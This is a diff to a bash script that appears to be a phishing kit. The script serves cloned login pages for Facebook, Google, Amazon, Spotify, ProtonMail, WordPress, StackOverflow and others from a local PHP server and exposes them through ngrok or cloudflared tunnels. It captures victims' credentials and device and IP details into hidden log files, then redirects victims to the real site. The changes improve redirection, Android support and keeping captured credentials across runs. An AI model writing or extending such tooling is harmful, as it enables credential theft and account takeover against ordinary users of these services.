@@ -72,6 +72,7 @@ reset_color() {
 #######
 
 arch=`uname -m`
+osnam=$(uname -o)
 ArNam=$(dpkg --print-architecture)
 #spinner
 spinner() {
@@ -376,6 +377,7 @@ function kill_session() {
 function url_checker() {
         if [ ! "${1//:*}" = http ]; then
 	        if [ ! "${1//:*}" = https ]; then
+			echo
                         printf "${red} Invalid URL. Please use http or https. \n "
                         exit 1
 		fi
@@ -415,6 +417,7 @@ function askuri() {
 	elif [[ $uri == "N" || $uri == "n" ]]; then
 		echo
 		final_url="You Haven't Modify URL!!!"
+
 	else
                 echo
 		error_msg "bro you type wrong..."
@@ -460,19 +463,19 @@ elif [[ $drk == n || $drk == N ]]; then
 PORT="8828"
 if [[ $p == "s" ]]; then
 echo
-printf " ${cyan1}Your Default Port is $PORT !${white} \n"
+msg "Your Default Port is $PORT !${white} \n"
 sleep 2
 main2
 elif [[ $p == "S" ]]; then
 echo
-printf " ${cyan1}Your Default Port is $PORT !${white} \n"
+msg "Your Default Port is $PORT !${white} \n"
 sleep 2
 launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");askuri;
 else
 final_url="Nothing to modify localhost."
 
 link="http://${HOST}:$PORT"
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection; php -S "$HOST":"$PORT" &> /dev/null & 
+launch="starting shark server"; splashdown="started shark server";printf "\n"; php -S "$HOST":"$PORT" &> /dev/null & 
 fi
 
 else
@@ -495,7 +498,6 @@ function redirc() {
 		elif [[ $stpver == "N" || $stpver == "n" ]]; then
 			oldy="otp.login.php"
 			FILE="${NOTPF}"
-                        #relink="https://instagram.com/tech2.gamer/"
 			OtP="01010101"
 			redrkask
 		else
@@ -515,18 +517,20 @@ printf "${yellow}${ysite}${cyan1} Redirect Option !!!\n${yellow}
 read ansm
 if [[ $ansm == "N" || $ansm == "n" ]]; then
 	echo
-	msg "Your Url is set as default."
+	msg "Your Url is set as default.[google.com]"
+	relink="https://google.com"
         rm -rf drk 
 	mkdir drk 
 	cp -R * drk &>/dev/null
 	cd drk
+	sed -i -e s,"$oldy","$relink",g $FILE
 elif [[ $ansm == "y" || $ansm == "Y" ]]; then
         redrk
 else
 	echo
 	error_msg "Somthing went wrong!!! try again!"
 	sleep 2
-	exit 1
+	redrkask
 fi
 }
 function redrk() {
@@ -553,7 +557,7 @@ if [[ -e ${logfile}.cloud.log ]]; then
 	rm -rf $logfile/.cloud.log
 	touch $logfile/.cloud.log
 fi
-if [[ `command -v termux-chroot` ]]; then
+if [[ `command -v termux-chroot` || "$osnam" == "Android" ]]; then
 	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; termux-chroot cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log > /dev/null 2>&1 & sleep 5 & spinner;
 else
 	launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; cloudflared tunnel --url "$HOST":"$PORT" --logfile ${logfile}.cloud.log  > /dev/null 2>&1 & sleep 5 & spinner;
@@ -580,8 +584,14 @@ if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "ngrok" ]]; then
 	        msg " ngrok is already installed."
 	        sleep 1
 		if [[ $valu != "19" ]]; then
-			redirc
-			main
+			if [[ $reddc == "TRUE" ]];then
+				redrkask
+				main
+			else
+				redirc
+				main
+			fi
+
 		else
 			main
 		fi
@@ -603,8 +613,14 @@ elif [[ $portfrd == "b" || $portfrd == "B" || $portfrd == "cloudflare" ]]; then
 		msg " cloudflare is already installed."
 		sleep 1
 		if [[ $valu != "19" ]]; then
-			redirc
-			main
+			if [[ $reddc == "TRUE" ]]; then
+				redrkask
+				main
+			else
+				redirc
+				main
+			fi
+
 		else
 			main
 		fi
@@ -617,9 +633,7 @@ elif [[ $portfrd == "b" || $portfrd == "B" || $portfrd == "cloudflare" ]]; then
 		echo
 		fix_cloudflared
 		decne
-	fi
-
-
+	fi 
 elif [[ $portfrd == "D" || $portfrd == "d" || $portfrd == "localhost" ]];then
 	p="d"
 	redirc
@@ -631,6 +645,8 @@ else
 	echo
         error_msg "bro you type wrong...\n"
         error_msg "try again!!\n"
+	sleep 3
+	prt
 fi
 
 }
@@ -658,29 +674,37 @@ echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Model:\e[1;0m $R\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Browser:\e[0m $E\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Version:\e[1;0m $K\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m $U"
-cat dumpip.txt >> .ipdump.txt
+cat dumpip.txt >> ../.ipdump.txt
 rm -rf dumpip.txt filter.txt
 while [ true ]; do
 	if [[ -e log.txt ]]; then
 		CRD=$(cat log.txt)
-		echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD\e[1;0m " & tail log.txt 2&>1 &
+		echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD "
+		tail -f log.txt 2&>1 &
+		echo "$KL" >> ../.dumplog.txt
+		cat log.txt >> ../.dumplog.txt
 		while [ true ]; do
 			if [[ -f dumpip.txt ]]; then
-				cat log.txt >> .dumplog.txt
-				#rm -rf dumpip.txt filter.txt log.txt
+				echo "$KL" >> ../.dumplog.txt
+				cat log.txt >> ../.dumplog.txt
+				rm -rf  log.txt
 				ipcatch
 			fi
 		done	
 		       
 	fi
 done
-if [[ -e dumpip.txt ]];then
-	echo ""
-	ipcatch
-fi
+#if [[ -e dumpip.txt ]];then
+#	echo ""
+#	ipcatch
+#fi
 }
 function ipinfo() {
 	echo
+	if [[ -e ../.dumplog.txt ]]; then
+		CRD1=$(cat ../.dumplog.txt)
+		msg "Your Old Credentials :\n$CRD1\n"
+	fi
         printf "${yellow}[•]  F E T C H I N G   D E V I C E.....\n\n"
 while [ true ]; do
 if [[ -e dumpip.txt ]]; then
@@ -808,8 +832,9 @@ decne() {
 		echo 
 		msg "Don't worry will soon provide a stable feature for this.\n\n"
 		sleep 7
-		prt && credentials
-		log.txt
+		prt 
+		credentials
+		tail -f log.txt
 		break;
 	else
 		if [[ $p != "d" ]]; then
@@ -875,6 +900,7 @@ function banner(){
 
         if [ $option = 01 ] || [ $option = 1 ];then
 	        cd ${phish}/facebook/
+		reddc="TRUE"
 		FILE="login.php"
 		oldy="https://facebook.com/"
 		decne
@@ -915,6 +941,7 @@ function banner(){
 			decne
 		elif [[ $gans == "B" || $gans == "b" ]]; then
 			cd $phish/google/
+			reddc="TRUE"
 			FILE="main.php"
 			oldy="https://www.google.com/account/about/"
 			decne
@@ -937,11 +964,13 @@ function banner(){
                 decne
 	elif [ $option = 09 ] || [ $option = 9 ];then
                 cd $phish/instafollow/
+		reddc="TRUE"
 		FILE="login.php"
 		oldy="https://skweezer.net"
 		decne
 	elif [ $option = 10 ];then
                 cd $phish/amazonsign/
+		reddc="TRUE"
 		FILE="posts.php"
 		oldy="https://www.amazon.in"
 		decne
@@ -965,6 +994,7 @@ function banner(){
 		decne
         elif [ $option = 14 ];then
                 cd $phish/spotify/
+		reddc="TRUE"
 		FILE="login.php"
 		oldy="https://www.spotify.com/in"
 		decne
@@ -1016,6 +1046,7 @@ function banner(){
 		decne
         elif [ $option = 23 ];then
                 cd $phish/wordpress/
+		reddc="TRUE"
 		FILE="post.php"
 		oldy="https://wordpress.com/"
 		decne
@@ -1027,11 +1058,13 @@ function banner(){
 		decne
 	elif [ $option = 25 ];then
                 cd $phish/protonmail/
+		reddc="TRUE"
 		FILE="post.php"
 		oldy="https://mail.protonmail.com/"
 		decne
         elif [ $option = 26 ];then
                 cd $phish/stackoverflow/
+		reddc="TRUE"
 		FILE="post.php"
 		oldy="https://stackoverflow.com"
 		decne
@@ -1049,6 +1082,7 @@ function banner(){
 		decne
 	elif [ $option = 29 ];then
                 cd $phish/ajio/
+		reddc="TRUE"
 		FILE="posts.php"
 		oldy="https://www.ajio.com"
 		decne
